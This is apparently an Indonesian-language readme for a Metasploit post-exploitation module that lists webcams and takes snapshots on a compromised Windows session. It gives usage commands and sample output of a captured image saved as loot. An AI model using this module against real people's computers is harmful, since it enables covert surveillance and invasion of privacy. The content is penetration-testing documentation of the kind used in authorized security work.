# webcam

Modul ini memungkinkan pengguna untuk mendeteksi webcam yang terpasang (dengan aksi `LIST`) atau mengambil `snapshot` (dengan aksi `SNAPSHOT`).

## Penulis
- sinn3r sinn3r@metasploit.com

## Platform
- `Windows`
  
## Cara Penggunaan di Metasploit

```
use post/windows/manage/webcam
set INDEX <ID>
set QUALITY 100
set SESSION <ID>
set VERBOSE 1
snapshot
```

Hasil output-nya seperti ini:

```
[*] 192.168.1.52 - Starting...
[*] 192.168.1.52 - Got frame
[+] 192.168.1.52 - Snapshot saved: /root/.msf4/loot/20250517001711_default_192.168.1.52_192.168.1.52.web_394465.jpg
[*] 192.168.1.52 - Stopped
[*] Post module execution completed
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/post/windows/manage/webcam/)
